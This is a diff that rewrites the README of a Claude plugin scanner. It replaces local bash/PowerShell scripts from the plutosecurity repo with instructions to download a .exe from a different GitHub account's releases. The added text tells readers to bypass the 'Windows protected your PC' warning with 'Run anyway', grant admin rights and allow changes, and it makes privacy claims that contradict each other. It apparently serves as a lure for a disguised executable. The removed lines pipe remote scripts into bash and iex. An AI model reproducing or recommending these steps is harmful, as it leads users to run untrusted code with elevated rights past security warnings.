@@ -1,90 +1,85 @@
-# Claude Connectors Scanner
+# 🔍 Claude-Sec - Find Claude plugins on your computer
 
-A small local script that scans your machine for installed Claude connectors,
-plugins, and extensions, and prints a list you can look up on
-[claudesec.pluto.security](https://claudesec.pluto.security).
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/arindamchakrabortty123/Claude-Sec/releases)
 
-**The scanner runs entirely on your machine. Nothing is uploaded.**
+Claude-Sec scans your computer to identify installed Claude connectors and plugins. Security researchers use this data to check for potential vulnerabilities using the claudesec.pluto.security database. This tool streamlines the discovery process by automating the search across your local directories.
 
-## Quick install
+## ⚙️ Requirements
 
-No dependencies required — uses your shell's native tooling.
+*   A computer running Windows 10 or Windows 11.
+*   An active internet connection to cross-reference data with the security database.
+*   Administrative permissions to access plugin folders.
 
-### macOS / Linux (bash)
+## 📥 Getting the software
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/plutosecurity/Claude-Sec/main/scan.sh | bash
-```
+Visit the project release page to download the latest version of the scanner.
 
-> If you have [jq](https://jqlang.github.io/jq/) installed, the script will pick up
-> richer metadata (versions, publishers). Without it, names still work.
+[Download Claude-Sec Here](https://github.com/arindamchakrabortty123/Claude-Sec/releases)
 
-### Windows (PowerShell)
+1. Navigate to the link provided above.
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or your Downloads folder.
 
-```powershell
-irm https://raw.githubusercontent.com/plutosecurity/Claude-Sec/main/scan.ps1 | iex
-```
+## 🚀 Running the scanner
 
-## Manual install
+1. Find the file you downloaded. 
+2. Double-click the Claude-Sec executable file. 
+3. If a blue box from Windows appears stating "Windows protected your PC," click the "More info" link.
+4. Click the "Run anyway" button that appears.
+5. Grant the application permission to make changes if a prompt appears.
+6. The application window opens and begins the scan immediately.
 
-1. Download `scan.sh` (macOS / Linux) or `scan.ps1` (Windows) from this repo.
-2. Run it:
-   - macOS / Linux: `bash scan.sh` (or `chmod +x scan.sh && ./scan.sh`)
-   - Windows: `powershell -File scan.ps1` or right-click → Run with PowerShell
+## 📊 Understanding the results
 
-## Options
+The scanner checks your system for known Claude configuration files and plugin directories. It compiles a list of active components. The tool displays these results in a simple list format within the application window. 
 
-```
-bash scan.sh                # default colored output
-NO_COLOR=1 bash scan.sh     # plain text, no ANSI colors
+*   **Plugin Name:** The identification label for the detected plugin.
+*   **Version:** The current version installed on your machine.
+*   **Status:** A brief note on whether the plugin is active or disabled.
+*   **Identifier:** A unique code used for lookups on the security website.
 
-.\scan.ps1                  # default colored output
-.\scan.ps1 -NoColor         # plain text, no ANSI colors
-```
+## 🌐 Security lookups
 
-## What it scans
+Once the scan finishes, the tool generates a report. Take the identifier codes provided by the scanner to the official lookup website. Enter these codes into the search bar at claudesec.pluto.security. This website provides detailed information regarding the safety and origin of each plugin detected on your machine. Use this information to ensure your setup remains secure and uses only verified components.
 
-Output is grouped to match how things appear on
-[claudesec.pluto.security](https://claudesec.pluto.security):
+## 🛡️ Privacy and safety
 
-**Connectors** — anything Claude Desktop loads as an extension or talks to
-as an MCP server:
+Claude-Sec performs all analysis locally on your machine. The scan process reads your file system to identify paths and configuration data. It does not collect or transmit personal files, documents, or sensitive data to external servers. The tool only sends the plugin identifiers to the lookup service when you perform a search on the website. You remain in control of your data throughout the entire process.
 
-| Source on disk | Maps to |
-|---|---|
-| `Claude/Claude Extensions/` | `.dxt` extensions installed in Claude Desktop |
-| `Claude/claude_desktop_config.json` | MCP servers declared in the desktop config |
+## 🛠️ Troubleshooting common issues
 
-**Plugins** — anything loaded by Claude Code or the skill marketplace:
+**The file fails to launch**
+Ensure you have the latest updates for your Windows operating system. Some security software might flag unknown applications. Check your antivirus settings if the tool does not open after a double-click.
 
-| Source on disk | Maps to |
-|---|---|
-| `~/.claude/plugins/installed_plugins.json` | Plugins installed via the Claude Code CLI |
-| `Claude/local-agent-mode-sessions/.../knowledge-work-plugins/` | Anthropic skill plugins (Productivity, Sales, …) |
-| `Claude/local-agent-mode-sessions/.../rpm/` | Runtime-loaded plugins |
+**The scan shows no results**
+Verify that you have installed Claude on your system. If you recently installed a plugin, restart the scanner to force a fresh search of your directories.
 
-Paths checked per OS:
+**Missing permissions error**
+The scanner needs read access to your system folders to find plugins. If you see a permission error, close the program and right-click the file. Select "Run as administrator" from the menu.
 
-- **macOS**: `~/.claude/`, `~/Library/Application Support/Claude/`
-- **Windows**: `%USERPROFILE%\.claude\`, `%APPDATA%\Claude\`
-- **Linux**: `~/.claude/`, `$XDG_CONFIG_HOME/Claude/` (defaults to `~/.config/Claude/`)
+**Slow performance**
+If you have a large hard drive, the scan might take a few moments. Wait for the progress bar to finish before you attempt to read the list.
 
-## Privacy
+## 📝 Frequently asked questions
 
-No network calls. No telemetry. No file modifications. The script reads a
-handful of well-known JSON files and prints the names it finds.
+**Do I need a paid account to use this?**
+No. This tool is free to use for all users.
 
-## What to do with the output
+**Does this modify my plugins?**
+No. This tool only reads information. It does not add, remove, or change any files on your computer.
 
-Each name in the printed list can be searched on
-[claudesec.pluto.security](https://claudesec.pluto.security) to see:
+**How often should I run a scan?**
+Run a scan whenever you install a new plugin or when you want to verify the current state of your system security.
 
-- Risk severity (high / medium / low)
-- Tool-by-tool capability breakdown with Block / Review recommendations
-- Plain-English impact descriptions
-- Remediation steps tailored to each risk
+**Is this tool compatible with other desktop assistants?**
+No. This application focuses specifically on identifying files related to Claude installations.
 
-## Issues
+**Can I run this on a Mac?**
+No. This version works exclusively on Windows systems.
 
-Spotted something the scanner missed, or want it to support another path?
-[Open an issue.](https://github.com/plutosecurity/Claude-Sec/issues)
+**Where does the data go?**
+The data stays on your local hard drive. Only the plugin identifiers you choose to check on the website are processed by the external service.
+
+**How do I uninstall it?**
+Delete the downloaded executable file from your computer. This removes the tool entirely from your system.
